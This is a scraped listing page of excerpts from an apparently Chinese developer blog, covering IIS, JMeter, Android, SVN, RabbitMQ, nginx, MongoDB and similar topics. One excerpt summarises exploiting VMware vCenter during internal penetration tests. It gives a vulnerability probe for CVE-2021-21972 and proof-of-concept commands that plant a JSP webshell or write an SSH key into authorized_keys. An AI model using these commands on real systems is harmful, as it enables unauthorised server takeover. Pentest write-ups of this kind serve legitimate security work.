		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在dist目录下新建web.config文件
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;configuration&gt; &lt;system.webServer&gt; &lt;rewrite&gt; &lt;rules&gt; &lt;rule name="Handle History Mode and custom 404/500" stopProcessing="true"&gt; &lt;match url="(.*)" /&gt; &lt;conditions logicalGrouping="MatchAll"&gt; &lt;add input="{REQUEST_FILENAME}" matchType="IsFile" negate="true" /&gt; &lt;add input="{REQUEST_FILENAME}" matchType="IsDirectory" negate="true" /&gt; &lt;/conditions&gt; &lt;action type="Rewrite" url="/" /&gt; &lt;/rule&gt; &lt;/rules&gt; &lt;/rewrite&gt; &lt;/system.webServer&gt; &lt;/configuration&gt; 注意： 新建文件后得重启下iis配置得web站点
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd0000b3bba7eb9db08cefcdde910e5c/" rel="bookmark">
			jmeter参数化之CSV文件参数化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们在做压测时，为了更接近真实场景，经常需要对接口的一些数据进行参数化，比如登录账号等等，本期讲述使用 CSV Data Set Config 进行参数化。
1.首先添加 CSV Data Set Config，位置为：
线程组→添加→配置原件→CSV Data Set Config
2.CSV元件参数：
3.创建参数数据，可以上TXT或者csv文件
下图文件数据第一行开始就是参数数据（没有标题），所以CSV元件配置时应该选择 False
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a081b0a4e18c979b8e1452c586c8bf8b/" rel="bookmark">
			Android 的app安装新版本以后，重新启动app。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.直接上代码。当你的app安装了新的版本以后，系统会发出3个广播。我们只需要在安卓程序中注册广播，指定接收更新应用完成后收到（android.intent.action.PACKAGE_REPLACED）的广播，接收到广播以后，就可以重新启动app
/*android.intent.action.PACKAGE_REMOVED 卸载应用完成后收到 android.intent.action.PACKAGE_ADDED 安装应用完成后收到 android.intent.action.PACKAGE_REPLACED 更新应用完成后收到， 在此之前后先收到前两个广播（PACKAGE_REMOVED 然后是 PACKAGE_ADDED 最后是 PACKAGE_REPLACED ）*/ class UninstallReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if (intent.getAction().equals("android.intent.action.PACKAGE_REMOVED")) { //这里做重新启动app ActivityManager manager = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE); manager.restartPackage("com.example.test"); } } 2.静态注册广播，也可以选择代码注册广播
//在AndroidManifest.xml中定义如下 &lt;receiver android:name=".UninstallReceiver"&gt; &lt;intent-filter&gt; &lt;action android:name="android.intent.action.SCREEN_ON" /&gt; &lt;action android:name="android.intent.action.BOOT_COMPLETED" /&gt; &lt;action android:name="android.intent.action.ACTION_PACKAGE_ADDED" /&gt; &lt;action android:name="android.intent.action.ACTION_PACKAGE_REPLACED" /&gt; &lt;action android:name="android.intent.action.ACTION_PACKAGE_REMOVED" /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; 3.代码注册广播
//注册广播 IntentFilter intentFilter = new IntentFilter(); UninstallReceiver uninstallReceiver = new UninstallReceiver(); intentFilter.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a081b0a4e18c979b8e1452c586c8bf8b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15e3e93d1541cb4ad5ca0a631f1bbfdd/" rel="bookmark">
			Auto.js 填充布局 layout_weight=“1“
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我在编写界面布局时，遇到了一个需求：
顶部和底部有按钮，而中间部分需要填满剩余空间且高度未知。
我通过使用layout_weight="1"完美解决我的问题，在这里记录一下。
"ui"; ui.layout( &lt;vertical&gt; &lt;text text=""bg="#000000"/&gt; &lt;text text=""bg="#222222"layout_weight="1"/&gt; &lt;text text=""bg="#000000"/&gt; &lt;/vertical&gt; ); QQ群 647162429
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/620e24ed15c585eddb6db8b4f200afb2/" rel="bookmark">
			vite初始化项目报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述 vite 初始化项目报错：Only file and data URLs are supported by the default ESM loader. Received protocol ‘node:‘ 初始化项目过程 $ npm init vue@latest Need to install the following packages: create-vue@3.6.1 Ok to proceed? (y) y Vue.js - The Progressive JavaScript Framework # 这里需要进行一些配置，项目名输入 vue3-test，其他默认回车即可 ? **Project name:** › vue3-test **Add TypeScript?** … No / Yes // 是否使用TS ✔ **Add JSX Support?** … No / Yes // 是否支持JSX ✔ **Add Vue Router for Single Page Application development?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/620e24ed15c585eddb6db8b4f200afb2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c45c6121fcef1d0752fcb41d75aab78/" rel="bookmark">
			了解Next.js
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 110. 了解Next.js Next.js是一个流行的React框架，为开发人员提供了许多有用的功能和便利，用于构建现代化、可扩展的Web应用程序。本文将详细介绍Next.js的使用方法、所需环境、应用场景，以及其优点和缺点。
1. Next.js是什么？ Next.js是一个基于React的轻量级框架，用于构建React应用程序。它在React的基础上提供了一些增强功能，包括服务器渲染（SSR）、静态生成（SSG）、路由等。Next.js的目标是简化React应用程序的开发流程，并提供更好的性能和开发体验。
2. 如何使用Next.js？ 要使用Next.js，可以按照以下步骤进行：
步骤1：创建新的Next.js项目
npx create-next-app my-app 上述命令将创建一个名为my-app的新Next.js项目。
步骤2：进入项目目录
cd my-app 步骤3：启动开发服务器
npm run dev 开发服务器将在本地启动，并监听文件更改，实时更新应用程序。
步骤4：开始编写代码
在项目目录中，可以编辑pages文件夹下的文件来创建页面。Next.js使用文件系统路由，每个文件代表一个页面。
3. 环境需求 使用Next.js开发应用程序需要满足以下环境需求：
Node.js（建议使用最新稳定版本）npm或yarn（用于安装和管理依赖项） 4. Next.js的应用场景 Next.js适用于各种Web应用程序开发场景，包括但不限于：
单页面应用程序（Single-Page Applications，SPA）多页面应用程序（Multiple-Page Applications，MPA）静态网站和博客电子商务平台企业级应用程序 5. Next.js的优点 Next.js具有许多优点，使其成为React应用程序开发的有力工具：
服务器渲染和静态生成：Next.js支持服务器渲染和静态生成，提供更好的性能、SEO和首次加载速度。简化的路由系统：使用文件系统路由，使路由定义变得简单明了。自动代码拆分：自动将应用程序代码拆分为可按需加载的块，提高性能和加载速度。热模块替换：在开发过程中保持应用程序的运行状态，只更新发生更改的模块。CSS模块和样式处理：内置支持CSS模块，可避免全局样式冲突，并支持CSS-in-JS和其他样式处理工具。丰富的插件生态系统：拥有活跃的插件社区，可轻松集成各种功能和工具。 6. Next.js的缺点 虽然Next.js具有许多优点，但也存在一些考虑因素：
学习曲线：相对于传统的React开发，使用Next.js可能需要一些时间来了解其概念和工作原理。复杂性：一些高级特性，如服务器渲染和静态生成，可能需要更多的配置和调整。项目规模：对于较小的项目，使用Next.js可能会带来额外的复杂性，可能并不是最佳选择。 总结 Next.js是一个强大的React框架，为开发人员提供了服务器渲染、静态生成、简化的路由系统等功能。它适用于各种Web应用程序开发场景，具有许多优点，包括更好的性能、开发体验和SEO。然而，学习曲线和复杂性可能需要额外的时间和配置。在选择Next.js时，需根据项目需求和规模进行综合考虑。
参考资料：
Next.js官方文档：https://nextjs.org/docs 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c611cf616cf17c039600e715ce299d3/" rel="bookmark">
			从零开始，轻松搭建和使用SVN版本控制系统的完整指南（包含本地和idea使用svn）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、SVN简介二、在Linux搭建SVN（在线安装）三、本地使用SVN四、idea集成svn 前言 这篇文章将为读者提供如下内容，希望对你有帮助（本人亲测，已成功）：
如何在Linux环境下搭建和配置SVN版本控制系统SVN的基本概念、安装SVN服务器以及设置用户和权限如何在本地使用SVN命令行工具进行代码或文件的提交、更新和回滚操作，如何在IDEA集成开发环境中配置和使用SVN插件，提高开发效率和团队协作。 提示：以下是本篇文章正文内容，下面案例可供参考
一、SVN简介 SVN比较GIT更安全但是也更麻烦；SVN搭建在服务器，用于代码协同管理；checkout（下载）、update（更新）、commit（提交）；底层有Berkeley DB(源码) 、FSFS(代码加密)； 二、在Linux搭建SVN（在线安装） 在线安装：yum -y install subversion
查看安装位置：rpm -ql subversion 创建版本库目录：mkdir -p /workdir/svn（这个目录大家可以按照自己的喜好设置）
初始化项目路径：svnadmin create /workdir/svn/项目名称，我这里使用的是group_1
进入conf修改配置文件，主要是添加用户信息（我的理解）
authz：权限配置文件；passwd：配置用户能够受权使用，里边包含用户名和密码；svnserve.conf：svn服务综合配置文件；
修改authz配置文件：
进入到conf目录下：cd /workdir/svn/vue-online/conf修改authz： vim authz 修改passwd配置文件
vim passwd设置用户名和密码，格式如下所示：
修改svn的服务文件
vim svnserve.conf
anon-access = none auth-access = write password-db= /workdir/svn/vue-online/conf/passwd authz-db= /workdir/svn/vue-online/conf/zauthz 启动svn服务器 启动服务： svnserve -d -r /workdir/svn查看进程：ps -ef |grep svn杀死进程：kill 9 进程号查看端口号：netstat -nutlp |grep 3690 三、本地使用SVN 下载安装SVN，我把这个放在阿里云盘，大家自取 —&gt; 下载链接
安装时注意这里要选择Entire feature will be installed on local hard drive，主要是为了后面可以在idea中集成svn。（记住你的安装路径，在idea的设置中需要配置）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1c611cf616cf17c039600e715ce299d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff2211aa2bed45afe44cd6522d657bd9/" rel="bookmark">
			python实现二叉树层次遍历
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、二叉树层次遍历
2、二叉树层次遍历进阶
1、二叉树层次遍历 思想：首先将根节点入队列，在每次循环中，记录当前层的节点个数，然后依次弹出队列中的节点，并将其值添加到当前层的列表。如果节点存在左孩子，将左孩子入队列；如果节点存在右孩子，将右孩子入队列。最后，将当前层的结果添加到结果列表中，并重复此过程直到队列为空
class TreeNode: def __init__(self, val=0, left=None, right=None): self.val = val self.left = left self.right = right def levelOrder(root): # 如果根节点为空，则返回空列表 if not root: return [] result = [] # 使用队列来进行层次遍历，将根节点入队列 queue = [root] while queue: # level_size：当前层的节点个数 level_size = len(queue) # current_level：存储当前层节点值的列表 current_level = [] # 遍历当前层的节点 for i in range(level_size): # 弹出队列中的第一个节点，并且将将节点值添加到当前层列表current_level中 node = queue.pop(0) current_level.append(node.val) # 层次遍历是从左到右的，先判断是否有左孩子 if node.left: queue.append(node.left) if node.right: queue.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ff2211aa2bed45afe44cd6522d657bd9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3d786c821573f7eec45a31ab028ba7e/" rel="bookmark">
			RabbitMQ的使用详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是MQ 1、什么是MQ
MQ（message queue），本质是个队列，FIFO先入先出。只不过队列中放的是message，是一种跨进程的通信机制，用于上下游传递消息。在互联网架构中，MQ是一种非常常见的上下游解耦的消息通信服务。使用了MQ之后，消息发送上游只需要依赖MQ，不用依赖其他服务。
2、为什么使用MQ
流量消峰 当一个系统只能够承受一万次点击的时候，这时候来了两万次点击，服务器就会宕机（采取方式是限制第一万次以上的访问）。而现在使用MQ来做缓冲，可以取消这个限制，把一秒内的访问分散成一段时间来处理（排队），缺点是，排队就要时间，所以收到访问结果会慢，但是这比不能访问要好。
应用解耦 以电商应用为例，用户下单，通过订单系统调用库存系统、物流系统、支付系统，如果耦合调用，当任何一个子系统出现了故障，都会造成下单操作异常。而当转变为基于消息队列的方式后（在调用之间加上队列），当一个子系统出现故障需要几分钟修复，在这几分钟内，用户的下单操作依然可以正常进行（对这个子系统要处理的内存会被缓存在消息队列中），等待故障的子系统修复好后就从缓存中获取去处理。这样用户基本感受不到子系统出现故障（因为可以正常下单操作），提升系统的可用性
异步处理 异步调用服务时，例如A调用B，B需要花费很长时间去执行，但是A需要知道B什么时候执行完成。以前的方式，是通过A过一段时间去调用B的查询api查询，或者A提供一个callback api，当B执行完就调用这个api来通知A。现在使用mq，A调用B后，只需要监听mq转发的消息。当B完成后，会发送一条信息给MQ，MQ会将此信息转发给A服务。这样A服务能及时得到异步处理成功的消息
简而言之，就是通过一个第三方，来接受B的完成信息，然后转发给A
3、MQ分类
ActiveMQ 优点：单机吞吐量万级，时效性 ms 级，可用性高，基于主从架构实现高可用性，消息可靠性较
低的概率丢失数据
缺点:官方社区现在对 ActiveMQ 5.x 维护越来越少，高吞吐量场景较少使用。
Kafka 为大数据而生的消息中间件。
优点: 性能卓越，单机写入 TPS 约在百万条/秒，最大的优点，就是吞吐量高。时效性 ms 级可用性非常高，kafka 是分布式的，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用,消费者采用 Pull 方式获取消息, 消息有序, 通过控制能够保证所有消息被消费且仅被消费一次;有优秀的第三方Kafka Web 管理界KafkaManager；在日志领域比较成熟，被多家公司和多个开源项目使用；功能支持：功能较为简单，主要支持简单的 MQ 功能，在大数据领域的实时计算以及日志采集被大规模使用
缺点：Kafka 单机超过 64 个队列/分区，Load 会发生明显的飙高现象，队列越多，load 越高，发送消
息响应时间变长，使用短轮询方式，实时性取决于轮询间隔时间，消费失败不支持重试；支持消息顺序，
但是一台代理宕机后，就会产生消息乱序，社区更新较慢；
RocketMQ 阿里巴巴的开源产品，用Java语言实现
优点:单机吞吐量十万级,可用性非常高，分布式架构,消息可以做到 0 丢失,MQ 功能较为完善，还是分
布式的，扩展性好,支持 10 亿级别的消息堆积，不会因为堆积导致性能下降,源码是 java 我们可以自己阅
读源码，定制自己公司的 MQ
缺点：支持的客户端语言不多，目前是 java 及 c++，其中 c++不成熟；社区活跃度一般,没有在 MQ
核心中去实现 JMS 等接口,有些系统要迁移需要修改大量代码
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b3d786c821573f7eec45a31ab028ba7e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05370508c0b41eddecd95f8b259a799f/" rel="bookmark">
			Vcenter实战利用方式总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章作者：hyyrent
文章来源：https://forum.butian.net/share/1893
在内网渗透中常常会碰到VmwareVcenter，对实战打法以及碰到的坑点做了一些总结，部分内容参考了师傅们提供的宝贵经验，衷心感谢各位师傅
0x01 指纹特征 title="+ ID_VC_Welcome +" 0x02 查看Vcenter版本 /sdk/vimServiceVersions.xml 0x03 CVE-2021-21972 影响范围
vCenter Server7.0 &lt; 7.0.U1cvCenter Server6.7 &lt; 6.7.U3lvCenter Server6.5 &lt; 6.5.U3n /ui/vropspluginui/rest/services/uploadova 访问上面的路径，如果404，则代表不存在漏洞，如果405 则可能存在漏洞
windows机器：
漏洞利用： GitHub - horizon3ai/CVE-2021-21972: Proof of Concept Exploit for vCenter CVE-2021-21972
python CVE-2021-21972.py -t x.x.x.x -p ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\gsl.jsp -o win -f gsl.jsp -t （目标地址） -f （上传的文件） -p （上传后的webshell路径，默认不用改） 上传后的路径为
https://x.x.x.x/statsreport/gsl.jsp 完整路径为
C:/ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport Linux机器：
1、写公私钥（需要22端口开放）
python3 CVE-2021-21972.py -t x.x.x.x -p /home/vsphere-ui/.ssh/authorized_keys -o unix -f id_rsa_2048.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05370508c0b41eddecd95f8b259a799f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e38aff4aa8fca2e75718356959e2f6c5/" rel="bookmark">
			随机双色球的生成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		利用数组，随机生成五组 双色球 候选号红（ 1-32 ） 6 位 蓝 (1-16) 1 位 该代码利用for循环生成五组随机数组，引入Random类，产生随机数，把随机数控制在1-32。 rand.nextInt(1, 33)代码产生的随机数就是1到32，不包括33。 因为双色球号码不能重复，所以要遍历数组用if语句来判断是否有相同的数。 \033[31m 数 、033[0m 是用来改变颜色的31m-39m是用来控制字颜色的，31m为红色。
public static void main(String[] args) { Random rand = new Random(); for (int x = 0; x &lt; 5; x++) { int[] reds = new int[6]; for (int i = 0; i &lt; reds.length; i++) { int ball = rand.nextInt(1, 33); boolean f = true; for (int n : reds) { if (n == ball) { f = false; break; } } if (f) { reds[i] = ball; } else { --i; } } Arrays.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e38aff4aa8fca2e75718356959e2f6c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2286fa6423b257e43eb2a585650fff9/" rel="bookmark">
			【网络原理之三】应用层协议HTTP和HTTPS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTTP什么是HTTP工作过程协议格式协议内容HTTP请求MethodURLURL的encode和decode Version请求报头请求正文 HTTP响应状态码响应报头 HTTPSHTTPS执行过程加密对称加密非对称加密 证书 HTTP 什么是HTTP HTTP：超文本传输协议。是一种应用非常广泛的应该层协议。
所谓 “超文本” 的含义, 就是传输的内容不仅仅是文本(比如 html, css 这个就是文本), 还可以是一些其他的资源, 比如图片,视频, 音频等二进制的数据。
完整应用是由前端+后端构成的，而前、后端之间的通讯是要依靠 HTTP来完成的。这就像消费者在网上买东西一样，商家和买件之间，需要一个快递公司，而 HTTP 就是这个快递公司，其中的请求方法GET/POST 相当于不同类型的快递类型(标准快递、加急快递)。
工作过程 当我们在浏览器中输入一个 “网址”, 此时浏览器就会给对应的服务器发送一个 HTTP 请求(request)。对方服务器收到这个请求之后, 经过计算处理, 就会返回一个 HTTP 响应(response)。
通过 F12 打开 chrome 的开发者工具, 切换到 Network 标签页。 然后刷新页面即可看到如下图效果。每一条记录都是一次 HTTP 请求/响应。
协议格式 HTTP 是一个文本格式的协议. 可以通过 Chrome 开发者工具或者 Fiddler 抓包, 分析 HTTP 请求/响应的细节.
左侧窗口显示了所有的 HTTP请求/响应, 可以选中某个请求查看详情.
右侧上方显示了 HTTP 请求的报文内容. (切换到 Raw 标签页可以看到详细的数据格式)
右侧下方显示了 HTTP 响应的报文内容. (切换到 Raw 标签页可以看到详细的数据格式)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2286fa6423b257e43eb2a585650fff9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/698d3bca6a504af5902e867f22de5b56/" rel="bookmark">
			【mongoTemplate】使用update更新数组内嵌文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【问题记录】使用 mongoTemplate 对嵌套在数组内的文档进行修改
文档数据：
{ "_id": ObjectId("64acb6feeab19dac9dfb2cab"), "name": "Sunny", "age": NumberInt("25"), "scores": [ { "math": NumberInt("0") }, { "english": NumberInt("69") } ], "city": "Yunnan" } 对上述math的值进行修改：
Update update = Update.update("scores.$.math", 90); 遇到如下报错：
com.mongodb.MongoWriteException: Write operation error on server localhost:27017. Write error: WriteError{code=2, message='The positional operator did not find the match needed from the query.', details={}}.
无法根据给定的字符串找到匹配项
对列表元素的正确操作👇🏻 对列表中的所有单项执行统一操作 //$[] 会选中所有单项，为列表中的每一个节点增加 english:666 Update update = Update.update("scores.$[].english", 666); { "_id": ObjectId("64acb6feeab19dac9dfb2cab"), "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/698d3bca6a504af5902e867f22de5b56/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/709f8ec1e209384a46deba06534490d1/" rel="bookmark">
			nginx如何设置访问路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 vim nginx.conf #user nobody; worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; #upstream myserver { #这里是设置负载均衡的地方！ #server 192.168.23.110:8080; #server 192.168.23.110:8081; #} sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { #root html; #这里是你设置访问的路径，例如：/home/test/，html的路径在：/usr/local/nginx/html/里面（你需要把前端dist包放到/usr/local/nginx/html/下面） root /home/test; #你需要把前端dist包放到/home/test/下面 index index.html index.htm; #proxy_pass http://myserver; #这里是上面设置负载均衡跳转的地方 } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/596854bf4c1df37fcb7cf54975e2af89/" rel="bookmark">
			xshell 左边的会话管理器不见怎么办？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们在使用xshell的时候，左边有会话管理器会方便很多
但是如果不小心把会话管理器给点没了，怎么恢复呢
点击“查看”--勾选“会话管理器”就搞定了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd678a0cc332e1b9284ae13dabf390e5/" rel="bookmark">
			UNITY 基础之 实现动态加载网络端、PC端和 ANDROID 端指定路径下的图片的简单方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、简单介绍 Unity中的一些基础知识点，便于后期查看学习。
本节介绍，如何动态加载网络上，电脑上或者Android手机上指定路径的图片的简单方式，方法不唯一，仅供参考。
二、实现原理 1、UnityWebRequest 发起网络请求，DownloadHandlerTexture 作为发起下载图片，解析得到图片
2、下载地址不仅支持网络路径，电脑端和Android 手机端等路径也支持
三、注意事项 1、移动端，例如 Android 注意请给读写权限
2、因为要加载网络服务器上的图片，还需要网络开启哈
四、效果预览 五、实现步骤 1、打开Unity，新建工程
2、在场景上布局UI，显示加载的图片
3、新建脚本，编辑代码，把脚本挂载到 UI上，勾选是加载网络图片，还是电脑Android上的图片
4、注意，Android 注意 给读写权限
5、运行效果如上
六、关键代码 using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;
public class LoadPicture : MonoBehaviour
{
public bool isLoadNetImage = false;
[SerializeField]
// 网络上的图片，也可以加载
private string url = @"http://a2.att.hudong.com/36/48/19300001357258133412489354717.jpg";
RawImage rawImage;
public string Url { get =&gt; url;
set {
url = value;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bd678a0cc332e1b9284ae13dabf390e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c184cf0126ed40ab5c4910f75fd3b81a/" rel="bookmark">
			Java返回数据库字符串类型的json格式字符串解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题：Java 程序中直接返回字符串格式的json数据出现了如下问题，带有 / 转义符号 解决方法 对这个返回的字段重新定义一个扩展字段，并使用 JSONArray 工具类进行转换
/** 小标题字符串 **/ private String smallList; /** 扩展字段=== 返回json小标题字符串 **/ @TableField(exist = false) private JSONArray smallLists; import cn.hutool.core.util.StrUtil; import cn.hutool.json.JSONArray; import cn.hutool.json.JSONUtil; //解析字符串格式 JSONArray jsonArray = JSONUtil.parseArray(smallList); public AjaxResult indexTitleCheck(@RequestHeader Map&lt;String, String&gt; headers) { List&lt;ChatTitleTemplate&gt; list = templateService.TitleTemplateList(); //遍历，返回json格式字符串 for (ChatTitleTemplate titleTemplate : list) { String smallList = titleTemplate.getSmallList(); JSONArray jsonArray = JSONUtil.parseArray(smallList); titleTemplate.setSmallLists(jsonArray); titleTemplate.setSmallList(null); } log.info("首页问题模板接口调用"); return AjaxResult.success("首页问题模板查询成功",list); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d9ba8214d6d68db768b818308f4240b/" rel="bookmark">
			jdk7 Files 快速进行多级文件遍历删除及拷贝
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一： 多级文件遍历
import lombok.extern.slf4j.Slf4j; import java.io.IOException; import java.nio.file.*; import java.nio.file.attribute.BasicFileAttributes; /** * jdk 7 Files 文件树遍历 */ @Slf4j public class TestFilesWalkFileTree { public static void main(String[] args) { try { Files.walkFileTree(Paths.get("D:\\test\\jdk8"),new SimpleFileVisitor&lt;Path&gt;(){ // 进入文件目录前 @Override public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException { log.error("进入目录---{}",dir); return super.preVisitDirectory(dir, attrs); } // 访问文件 如需删除，在此方法内删除文件 @Override public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException { log.error("文件---{}",file); // Files.delete(file); return super.visitFile(file, attrs); } // 访问失败操作 @Override public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException { log.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d9ba8214d6d68db768b818308f4240b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f12021616fb824a11698a32bbe1d51a1/" rel="bookmark">
			MobaXterm下通过串口传文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 简介 在嵌入式调试过程中，我们经常会使用调试串口来查看Log或者执行指令，其实，调试串口还有另一种功能，就是传输文件，本文说明使用MobaXterm串口工具来传输文件。
环境要求 嵌入式系统需要安装lsz和lrz，PC上能正常使用MobaXterm作为串口工具。
文件从设备传到PC 在串口执行：lsz test.file ，如：
在MobaXterm软件上右击，出现菜单，选择"Receive file using Z-modem"，如：
选择之后会弹出菜单，选择要保存的路径即可。 文件从PC传到设备 在串口工具中，通过指令切换到需要保存的目录并执行：lrz，如：
在MobaXterm软件上右击，出现菜单，选择"Send file using Z-modem"，如：
选择之后会弹出菜单，选择要传输的文件即可。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01e4067cd8bf06f42694a6b14316e560/" rel="bookmark">
			Java027——日期时间类&amp;日历类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、初始化时间对象的两种方式 Java的日期时间类在 java.util.Date包中，Date 类用于表示日期时间，使用该类表示时间需要先使用其构造方法创建对象
1.1、Date 类提供两个构造方法来实例化 Date 对象。 Date() 无参构造函数使用当前日期和时间来初始化对象。
Date(long millisec) 有参构造函数接收一个参数，该参数是从 1970 年 1 月 1 日起的毫秒数。
示例演示
class test { public static void main(String[] args) { Date date1 = new Date();//调用Date无参构造，初始化一个时间对象 System.out.println(date1); long nowTime = System.currentTimeMillis();//当前系统时间所经历的毫秒数 System.out.println(nowTime); Date date2 = new Date(newTime);//使用毫秒数作为参数，调用Date有参构造初始化一个时间对象 System.out.println(date2); } } //运行结果 Tue Jul 11 15:08:41 CST 2023 1689059321476 Tue Jul 11 15:08:41 CST 2023 二、Date 类的常用方法 ---------------------------------------------------------------------------------------------------------------------- 方法 | 说明 ---------------------------------------------------------------------------------------------------------------------- getTime() | 获得自 1970 年 1月 1日 00:00:00 GMT 开始到现在所经过的毫秒数 toString()	把此 Date 对象转换为以下形式的 String： dow mon dd hh:mm:ss zzz yyyy 其中： dow 是一周中的某一	天 (Sun, Mon, Tue, Wed, Thu, Fri, Sat)，zzz是时间标准。	---------------------------------------------------------------------------------------------------------------------- //下面的很少使用，了解即可 after(Date when) | 测试当前日期是否在指定的日期之后 before(Date when) | 测试当前日期是否在指定的日期之前 setTime(long time) | 设置当前 Date 对象所表示的日期时间值,该值用以表示1970年1月1日 00:00:00 GMT 以后time毫秒的时间点 示例演示
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01e4067cd8bf06f42694a6b14316e560/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d25483345988ea937fb4d9337683dcb2/" rel="bookmark">
			ThreadLocal学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、threadLocal图解 java.lang.ThreadLocal类实现了线程的本地存储。
ThreadLocal的内部实现：
ThreadLocal的内部实现包括一个类似HashMap的对象，这里称之ThreadLocalMap。
ThreadLocalMap的key会持有对ThreadLocal实例的弱引用（Weak Reference），value会引用具体存储的对象实例。
【强引用】：
1、threalLocal对象指向threalLocalMap中的key .
2、线程对象 指向 堆中的 threalLocalMap。
【弱引用】：
1、threalLocalMap 的key为 threadLocal对象，即threadLocal对象 指向key为弱引用。
